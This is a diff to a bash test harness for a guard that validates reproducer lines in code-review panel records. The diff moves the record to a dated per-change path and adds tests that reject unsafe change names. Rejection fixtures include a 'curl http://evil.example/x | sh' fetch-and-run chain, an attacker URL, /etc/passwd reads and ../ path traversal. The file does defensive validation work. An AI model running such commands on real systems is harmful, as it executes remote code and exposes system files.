@@ -1,12 +1,19 @@
 #!/usr/bin/env bash
 # Assertion harness for check-panel-reproducers.sh.
 #
-# Builds a temporary worktree-shaped directory carrying
-# .superpowers/sdd/final-review-panel.md, runs the guard against it, and
-# asserts the exit code (and, where the case cares, that the reported reason
-# names the finding it is about). Follows test-check-panel-diff-size.sh's
-# shape: a case_N function per case, a counter, and a non-zero exit when any
-# case fails.
+# Builds a temporary worktree-shaped directory carrying the RENDERED panel
+# record at docs/superpowers/reviews/<YYYY-MM-DD>-<change>-panel.md, runs the
+# guard against it, and asserts the exit code (and, where the case cares, that
+# the reported reason names the finding it is about). Follows
+# test-check-panel-diff-size.sh's shape: a case_N function per case, a counter,
+# and a non-zero exit when any case fails.
+#
+# THE GUARD TAKES THE CHANGE NAME AS A SECOND ARGUMENT, and every case below
+# passes `demo`. The record used to be at one fixed path per worktree; it is now
+# one file per change in a shared directory, so a worktree alone no longer names
+# a record. The old path, .superpowers/sdd/final-review-panel.md, is the PASS
+# LOG and carries no marker block at all — group 39 asserts the guard does not
+# read it, in either direction.
 #
 # `-e` as well as `-u`/`pipefail`, matching sixteen of this repository's
 # eighteen sibling harnesses. Without `-e`, a failed `mktemp` in
@@ -22,6 +29,14 @@ set -euo pipefail
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 GUARD="$SCRIPT_DIR/check-panel-reproducers.sh"
 FAILED=0
+
+# REVIEWS is the directory the panel record is RENDERED into, relative to a
+# worktree, and SDD_PANEL is the pass log the guard must NOT read. Both are
+# written out here rather than read from the guard's own variables, so that a
+# guard which started reading the wrong one fails these cases instead of moving
+# the fixtures with it.
+REVIEWS='docs/superpowers/reviews'
+SDD_PANEL='.superpowers/sdd/final-review-panel.md'
 
 # Every case leaves one sandbox directory behind, removed on exit including
 # on a failed assertion. An indexed array, not a space-separated string:
@@ -50,8 +65,12 @@ make_worktree() {
     exit 1
   }
   WORKTREES+=("$wt")
-  mkdir -p "$wt/.superpowers/sdd"
-  printf '%s\n' "$1" > "$wt/.superpowers/sdd/final-review-panel.md"
+  # The record goes where the renderer writes it — the dated path under
+  # $REVIEWS, for the change `demo` every case below names. The sdd directory
+  # is created empty beside it because it exists in every real worktree as the
+  # pass log's home; group 39 is what asserts the guard never reads it.
+  mkdir -p "$wt/.superpowers/sdd" "$wt/$REVIEWS"
+  printf '%s\n' "$1" > "$wt/$REVIEWS/2026-01-01-demo-panel.md"
   printf '%s' "$wt"
 }
 
@@ -106,7 +125,7 @@ finding-status: F2 fixed
 reproducers-total: 2
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
 finding-reproducer: F2 none — prose-only, no runnable check')"
-expect_exit 'case 1: all present exits 0' 0 "$GUARD" "$wt"
+expect_exit 'case 1: all present exits 0' 0 "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 2. A finding named in the status block has no reproducer line — exit 1,
@@ -123,7 +142,7 @@ finding-status: F2 open
 
 reproducers-total: 1
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 2: missing reproducer for F2 exits 1 and names it' 1 'F2 carry no reproducer' "$GUARD" "$wt"
+expect_exit_and_names 'case 2: missing reproducer for F2 exits 1 and names it' 1 'F2 carry no reproducer' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 3. reproducers-total disagrees with the number of anchored reproducer
@@ -136,7 +155,7 @@ finding-status: F2 fixed
 reproducers-total: 5
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
 finding-reproducer: F2 none — prose-only, no runnable check')"
-expect_exit_and_names 'case 3: reproducers-total mismatch exits 1' 1 'reproducers-total' "$GUARD" "$wt"
+expect_exit_and_names 'case 3: reproducers-total mismatch exits 1' 1 'reproducers-total' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 4. Two finding-reproducer: lines reuse F1 — exit 1, naming the reused
@@ -148,7 +167,7 @@ finding-status: F1 fixed
 reproducers-total: 2
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
 finding-reproducer: F1 none — prose-only, no runnable check')"
-expect_exit_and_names 'case 4: reused identifier exits 1 and names F1' 1 'F1' "$GUARD" "$wt"
+expect_exit_and_names 'case 4: reused identifier exits 1 and names F1' 1 'F1' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 5. A finding-reproducer: line is indented, or carries an identifier with
@@ -159,14 +178,14 @@ finding-status: F1 fixed
 
 reproducers-total: 1
  finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit 'case 5: indented reproducer line exits 1' 1 "$GUARD" "$wt"
+expect_exit 'case 5: indented reproducer line exits 1' 1 "$GUARD" "$wt" demo
 
 wt="$(make_worktree 'findings-total: 1
 finding-status: F1 fixed
 
 reproducers-total: 1
 finding-reproducer: F1')"
-expect_exit 'case 5b: identifier with nothing after it exits 1' 1 "$GUARD" "$wt"
+expect_exit 'case 5b: identifier with nothing after it exits 1' 1 "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 6. none — <reason> is accepted as well-formed — exit 0.
@@ -176,7 +195,7 @@ finding-status: F1 fixed
 
 reproducers-total: 1
 finding-reproducer: F1 none — prose-only, no runnable check')"
-expect_exit 'case 6: none — <reason> is well-formed, exits 0' 0 "$GUARD" "$wt"
+expect_exit 'case 6: none — <reason> is well-formed, exits 0' 0 "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 7. A record with findings-total: 0, no status markers, reproducers-total:
@@ -185,14 +204,14 @@ expect_exit 'case 6: none — <reason> is well-formed, exits 0' 0 "$GUARD" "$wt"
 wt="$(make_worktree 'findings-total: 0
 
 reproducers-total: 0')"
-expect_exit 'case 7: zero findings exits 0' 0 "$GUARD" "$wt"
+expect_exit 'case 7: zero findings exits 0' 0 "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 8. No panel record at the expected path — exit 2.
 # ===========================================================================
 wt8="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
 WORKTREES+=("$wt8")
-expect_exit 'case 8: missing record exits 2' 2 "$GUARD" "$wt8"
+expect_exit 'case 8: missing record exits 2' 2 "$GUARD" "$wt8" demo
 
 # ===========================================================================
 # 9. The argument is not a directory — exit 2, naming the argument as not a
@@ -201,7 +220,7 @@ expect_exit 'case 8: missing record exits 2' 2 "$GUARD" "$wt8"
 #    2 but for a different reason and with a different message.
 # ===========================================================================
 not_a_dir="$(mktemp "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
-expect_exit_and_names 'case 9: non-directory argument exits 2 and names it' 2 'not a directory' "$GUARD" "$not_a_dir"
+expect_exit_and_names 'case 9: non-directory argument exits 2 and names it' 2 'not a directory' "$GUARD" "$not_a_dir" demo
 rm -f "$not_a_dir"
 
 # ===========================================================================
@@ -218,7 +237,7 @@ finding-status: F1 fixed
 reproducers-total: 2
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
 finding-reproducer: F9 none — prose-only, no runnable check')"
-expect_exit_and_names 'case 10: reproducer names unknown F9 exits 1' 1 'F9, which the finding-status block does not name' "$GUARD" "$wt"
+expect_exit_and_names 'case 10: reproducer names unknown F9 exits 1' 1 'F9, which the finding-status block does not name' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 11. A finding-reproducer: line is indented while every identifier
@@ -234,7 +253,7 @@ finding-status: F1 fixed
 reproducers-total: 1
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
  finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 11: indented reproducer line is isolated and exits 1' 1 'line(s) naming finding-reproducer:' "$GUARD" "$wt"
+expect_exit_and_names 'case 11: indented reproducer line is isolated and exits 1' 1 'line(s) naming finding-reproducer:' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 12. No reproducers-total: line at all — exit 1. Isolates the
@@ -245,7 +264,7 @@ wt="$(make_worktree 'findings-total: 1
 finding-status: F1 fixed
 
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 12: missing reproducers-total line exits 1' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt"
+expect_exit_and_names 'case 12: missing reproducers-total line exits 1' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 13. Two reproducers-total: lines — exit 1, same check as case 12.
@@ -256,7 +275,7 @@ finding-status: F1 fixed
 reproducers-total: 1
 reproducers-total: 1
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 13: duplicated reproducers-total line exits 1' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt"
+expect_exit_and_names 'case 13: duplicated reproducers-total line exits 1' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 14. The record path is a directory, not a file — exit 2. `-r` alone is
@@ -264,8 +283,8 @@ expect_exit_and_names 'case 13: duplicated reproducers-total line exits 1' 1 "ex
 # ===========================================================================
 wt14="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
 WORKTREES+=("$wt14")
-mkdir -p "$wt14/.superpowers/sdd/final-review-panel.md"
-expect_exit_and_names 'case 14: directory-shaped record path exits 2' 2 'no readable panel record' "$GUARD" "$wt14"
+mkdir -p "$wt14/$REVIEWS/2026-01-01-demo-panel.md"
+expect_exit_and_names 'case 14: directory-shaped record path exits 2' 2 'no readable panel record' "$GUARD" "$wt14" demo
 
 # ===========================================================================
 # 15. A finding-reproducer: line reads a bare `none` with no reason — exit
@@ -278,7 +297,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 none')"
-expect_exit_and_names 'case 15: bare none with no reason exits 1' 1 "declare 'none' with no reason" "$GUARD" "$wt"
+expect_exit_and_names 'case 15: bare none with no reason exits 1' 1 "declare 'none' with no reason" "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 16. The worktree argument is a RELATIVE path beginning with `-`
@@ -292,15 +311,15 @@ expect_exit_and_names 'case 15: bare none with no reason exits 1' 1 "declare 'no
 # ===========================================================================
 base16="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
 WORKTREES+=("$base16")
-mkdir -p "$base16/-dashy/.superpowers/sdd"
+mkdir -p "$base16/-dashy/$REVIEWS"
 printf '%s\n' 'findings-total: 2
 finding-status: F1 fixed
 finding-status: F2 open
 
 reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh' > "$base16/-dashy/.superpowers/sdd/final-review-panel.md"
+finding-reproducer: F1 scripts/test-check-panel-reproducers.sh' > "$base16/-dashy/$REVIEWS/2026-01-01-demo-panel.md"
 set +e
-out16="$(cd "$base16" && "$GUARD" "-dashy" 2>&1)"; got16=$?
+out16="$(cd "$base16" && "$GUARD" "-dashy" demo 2>&1)"; got16=$?
 set -e
 if [[ "$got16" == 1 ]] && [[ "$out16" == *'F2'* ]]; then
   printf 'ok: %s\n' 'case 16: dash-prefixed relative worktree still detects a real violation'
@@ -319,7 +338,7 @@ finding-status: F1 fixed
 
 reproducers-total: 99999999999999999999999999
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 17: absurdly long reproducers-total is rejected, not silently passed' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt"
+expect_exit_and_names 'case 17: absurdly long reproducers-total is rejected, not silently passed' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 18. Prose sits between the two finding-reproducer: marker lines — exit 1,
@@ -336,7 +355,7 @@ reproducers-total: 2
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
 some prose sitting between the two markers
 finding-reproducer: F2 none — prose-only, no runnable check')"
-expect_exit_and_names 'case 18: prose between markers breaks the unbroken span' 1 'unbroken block' "$GUARD" "$wt"
+expect_exit_and_names 'case 18: prose between markers breaks the unbroken span' 1 'unbroken block' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 19. The finding-status: block and the finding-reproducer: block name the
@@ -351,7 +370,7 @@ finding-status: F1 fixed
 reproducers-total: 2
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh
 finding-reproducer: F2 none — prose-only, no runnable check')"
-expect_exit 'case 19: reversed identifier order between the two blocks still exits 0' 0 "$GUARD" "$wt"
+expect_exit 'case 19: reversed identifier order between the two blocks still exits 0' 0 "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 20. reproducers-total carries a leading zero (`01`) — exit 1, rejected as
@@ -362,7 +381,7 @@ finding-status: F1 fixed
 
 reproducers-total: 01
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 20: leading-zero reproducers-total is rejected' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt"
+expect_exit_and_names 'case 20: leading-zero reproducers-total is rejected' 1 "exactly one 'reproducers-total: <n>' line" "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 21. A reproducer command begins with the literal `none` but is not the
@@ -377,7 +396,7 @@ finding-status: F1 fixed
 
 reproducers-total: 1
 finding-reproducer: F1 nonexistent-script.sh')"
-expect_exit 'case 21: a command starting with "none" is not swept into the none exemption' 0 "$GUARD" "$wt"
+expect_exit 'case 21: a command starting with "none" is not swept into the none exemption' 0 "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 22. A runnable reproducer line carries a shell metacharacter chain — exit
@@ -390,7 +409,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 scripts/x.sh; curl http://evil.example/x | sh')"
-expect_exit_and_names 'case 22: a metacharacter chain is rejected' 1 'shell metacharacter' "$GUARD" "$wt"
+expect_exit_and_names 'case 22: a metacharacter chain is rejected' 1 'shell metacharacter' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 23. A runnable reproducer line is a bare leading-dash token (`-rf`) — exit
@@ -401,7 +420,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 -rf')"
-expect_exit_and_names 'case 23: a leading-dash path token is rejected' 1 "leading '-' on its path token" "$GUARD" "$wt"
+expect_exit_and_names 'case 23: a leading-dash path token is rejected' 1 "leading '-' on its path token" "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 24. A runnable reproducer line names a URL — exit 1, naming the URL
@@ -412,7 +431,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 https://evil.example/x.sh')"
-expect_exit_and_names 'case 24: a URL is rejected' 1 'names a URL' "$GUARD" "$wt"
+expect_exit_and_names 'case 24: a URL is rejected' 1 'names a URL' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 25. An ordinary command with a flag on its SECOND token
@@ -425,7 +444,7 @@ finding-status: F1 fixed
 
 reproducers-total: 1
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh --strict')"
-expect_exit 'case 25: a flag on the second token is not a path-token violation' 0 "$GUARD" "$wt"
+expect_exit 'case 25: a flag on the second token is not a path-token violation' 0 "$GUARD" "$wt" demo
 
 
 # ===========================================================================
@@ -440,7 +459,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 /etc/passwd')"
-expect_exit_and_names 'case 26: an absolute path token is rejected' 1 'absolute token' "$GUARD" "$wt"
+expect_exit_and_names 'case 26: an absolute path token is rejected' 1 'absolute token' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 27. A runnable reproducer's ARGUMENT (not its path token) is an absolute
@@ -453,7 +472,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 scripts/x.sh /etc/passwd')"
-expect_exit_and_names 'case 27: an absolute argument is rejected' 1 'absolute token' "$GUARD" "$wt"
+expect_exit_and_names 'case 27: an absolute argument is rejected' 1 'absolute token' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 28. A runnable reproducer's PATH TOKEN carries a `..` path segment
@@ -465,7 +484,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 ../../../../../../etc/passwd')"
-expect_exit_and_names 'case 28: a `..`-traversal path token is rejected' 1 "'..' path segment" "$GUARD" "$wt"
+expect_exit_and_names 'case 28: a `..`-traversal path token is rejected' 1 "'..' path segment" "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 29. A runnable reproducer's ARGUMENT carries a `..` path segment
@@ -477,7 +496,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 scripts/x.sh ../../../etc/passwd')"
-expect_exit_and_names 'case 29: a `..`-traversal argument is rejected' 1 "'..' path segment" "$GUARD" "$wt"
+expect_exit_and_names 'case 29: a `..`-traversal argument is rejected' 1 "'..' path segment" "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 30. A positive control for cases 28-29: a path token containing the two
@@ -491,7 +510,7 @@ finding-status: F1 fixed
 
 reproducers-total: 1
 finding-reproducer: F1 scripts/foo..bar.sh')"
-expect_exit 'case 30: two dots inside a filename, not a path segment, is not rejected' 0 "$GUARD" "$wt"
+expect_exit 'case 30: two dots inside a filename, not a path segment, is not rejected' 0 "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 31. A NUL byte sits inside a finding-reproducer: line — exit 1, naming the
@@ -502,9 +521,9 @@ expect_exit 'case 30: two dots inside a filename, not a path segment, is not rej
 # ===========================================================================
 wt31="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
 WORKTREES+=("$wt31")
-mkdir -p "$wt31/.superpowers/sdd"
-printf 'findings-total: 1\nfinding-status: F1 open\n\nreproducers-total: 1\nfinding-reproducer: F1 scripts/y\0.sh\n' > "$wt31/.superpowers/sdd/final-review-panel.md"
-expect_exit_and_names 'case 31: a NUL byte in the record is rejected' 1 'NUL byte' "$GUARD" "$wt31"
+mkdir -p "$wt31/$REVIEWS"
+printf 'findings-total: 1\nfinding-status: F1 open\n\nreproducers-total: 1\nfinding-reproducer: F1 scripts/y\0.sh\n' > "$wt31/$REVIEWS/2026-01-01-demo-panel.md"
+expect_exit_and_names 'case 31: a NUL byte in the record is rejected' 1 'NUL byte' "$GUARD" "$wt31" demo
 
 # ===========================================================================
 # 32. A runnable reproducer line ends in a trailing backslash
@@ -517,7 +536,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 scripts/x.sh\')"
-expect_exit_and_names 'case 32: a trailing backslash is rejected' 1 'shell metacharacter' "$GUARD" "$wt"
+expect_exit_and_names 'case 32: a trailing backslash is rejected' 1 'shell metacharacter' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 33. A malformed `reproducers-total: 01` line sits BESIDE a well-formed
@@ -532,7 +551,7 @@ finding-status: F1 fixed
 reproducers-total: 01
 reproducers-total: 1
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 33: a malformed reproducers-total beside a well-formed one is rejected' 1 'not well-formed' "$GUARD" "$wt"
+expect_exit_and_names 'case 33: a malformed reproducers-total beside a well-formed one is rejected' 1 'not well-formed' "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 34. Every banned shell metacharacter, INDIVIDUALLY, triggers rejection — a
@@ -555,7 +574,7 @@ finding-status: F1 open
 
 reproducers-total: 1
 finding-reproducer: F1 scripts/x${mc_c}sh")"
-  expect_exit_and_names "case 34.$mc_i: banned metacharacter '$mc_c' alone is rejected" 1 'shell metacharacter' "$GUARD" "$wt"
+  expect_exit_and_names "case 34.$mc_i: banned metacharacter '$mc_c' alone is rejected" 1 'shell metacharacter' "$GUARD" "$wt" demo
   mc_i=$((mc_i + 1))
 done
 
@@ -570,7 +589,7 @@ finding-status: F1 fixed
 
 reproducers-total: 1
 finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit "case 35: an ordinary command with no banned metacharacter is accepted" 0 "$GUARD" "$wt"
+expect_exit "case 35: an ordinary command with no banned metacharacter is accepted" 0 "$GUARD" "$wt" demo
 
 # ===========================================================================
 # 36. check-panel-reproducers.sh and run-reproducer.sh agree on the
@@ -625,7 +644,7 @@ MISSING_DEP_DIR="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test-missi
 WORKTREES+=("$MISSING_DEP_DIR")
 cp "$GUARD" "$MISSING_DEP_DIR/check-panel-reproducers.sh"
 expect_exit_and_names 'case 37: a missing reproducer-metachars.sh is cannot-answer, not violations-found' 2 'cannot read' \
-  "$MISSING_DEP_DIR/check-panel-reproducers.sh" "$wt"
+  "$MISSING_DEP_DIR/check-panel-reproducers.sh" "$wt" demo
 
 # ===========================================================================
 # 38. A missing scripts/lib/panel-record.sh is likewise cannot-answer (exit
@@ -650,10 +669,85 @@ WORKTREES+=("$MISSING_LIB_DIR")
 cp "$GUARD" "$MISSING_LIB_DIR/check-panel-reproducers.sh"
 cp "$SCRIPT_DIR/reproducer-metachars.sh" "$MISSING_LIB_DIR/reproducer-metachars.sh"
 expect_exit_and_names 'case 38: a missing lib/panel-record.sh is cannot-answer, not violations-found' 2 'cannot read' \
-  "$MISSING_LIB_DIR/check-panel-reproducers.sh" "$wt"
+  "$MISSING_LIB_DIR/check-panel-reproducers.sh" "$wt" demo
+
+# ===========================================================================
+# 39. THE RECORD IS READ WHERE IT IS RENDERED, AND ONLY THERE.
+#
+#     Every case above already proves the rendered record is read — make_worktree
+#     writes it nowhere else. This group proves the other half: that the guard
+#     does not also read, or fall back to, the pass log at
+#     .superpowers/sdd/final-review-panel.md. Without it a guard that silently
+#     fell back would pass this whole suite while reading a file nothing writes,
+#     and every fix round would fail on a record that carries no marker block.
+#
+#     39a — a well-formed record at the OLD path only, and nothing at the new
+#     one, is no record at all: exit 2, not exit 0.
+# ===========================================================================
+wt39a="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
+WORKTREES+=("$wt39a")
+mkdir -p "$wt39a/.superpowers/sdd" "$wt39a/$REVIEWS"
+printf '%s\n' 'findings-total: 1
+finding-status: F1 fixed
+
+reproducers-total: 1
+finding-reproducer: F1 scripts/test-check-panel-reproducers.sh' > "$wt39a/$SDD_PANEL"
+expect_exit_and_names 'case 39a: a record at the old sdd path only exits 2' 2 'no readable panel record' "$GUARD" "$wt39a" demo
+
+# ===========================================================================
+# 39b. The other direction, which a fallback alone would not catch: a guard
+#      reading BOTH files would pass 39a and still let the pass log's contents
+#      raise violations. A record at the old path missing every reproducer,
+#      beside a complete rendered record, must count for nothing — exit 0.
+# ===========================================================================
+wt="$(make_worktree 'findings-total: 1
+finding-status: F1 fixed
+
+reproducers-total: 1
+finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
+printf '%s\n' 'findings-total: 3
+finding-status: F7 open
+finding-status: F8 open
+finding-status: F9 open
+
+reproducers-total: 0' > "$wt/$SDD_PANEL"
+expect_exit 'case 39b: the old sdd path raises no violation of its own' 0 "$GUARD" "$wt" demo
+
+# ===========================================================================
+# 39c. THE MATCH IS ANCHORED ON THE CHANGE NAME. `*-demo-panel.md` also matches
+#      `2026-01-01-other-demo-panel.md`, another change's record in the same
+#      shared directory; answering this change's question with that change's
+#      findings is the read-side half of the incident records.Destination's own
+#      Protection 1 comment records on the write side.
+# ===========================================================================
+wt39c="$(make_worktree 'findings-total: 1
+finding-status: F1 fixed
+
+reproducers-total: 1
+finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
+mv "$wt39c/$REVIEWS/2026-01-01-demo-panel.md" "$wt39c/$REVIEWS/2026-01-01-other-demo-panel.md"
+expect_exit_and_names 'case 39c: another change'"'"'s dated record is not this change'"'"'s record' 2 'no readable panel record' "$GUARD" "$wt39c" demo
+
+# ===========================================================================
+# 39d. The change name is PR-controlled — it reaches this guard from a state
+#      file anyone able to open a pull request can edit — and it is matched
+#      against the entries of a directory. These are the same shapes
+#      test-check-unfinished-work.sh rejects, asserted here so that the two
+#      copies of the allowlist cannot drift apart in silence, and one case for
+#      the name being absent altogether.
+# ===========================================================================
+wt39d="$(make_worktree 'findings-total: 1
+finding-status: F1 fixed
+
+reproducers-total: 1
+finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
+for bad_name in "../../../planted/clear" "demo*" "demo/../demo" ".hidden" "demo?x"; do
+  expect_exit_and_names "case 39d: change name '$bad_name' is rejected" 2 'is not a plain change name' "$GUARD" "$wt39d" "$bad_name"
+done
+expect_exit_and_names 'case 39d: a missing change name is rejected' 2 'usage:' "$GUARD" "$wt39d"
 
 if [ "$FAILED" -ne 0 ]; then
   printf 'check-panel-reproducers-test: one or more cases failed\n' >&2
   exit 1
 fi
-printf 'check-panel-reproducers-test: all 38 cases plus the metacharacter loop pass\n'
+printf 'check-panel-reproducers-test: all 39 cases plus the metacharacter loop pass\n'
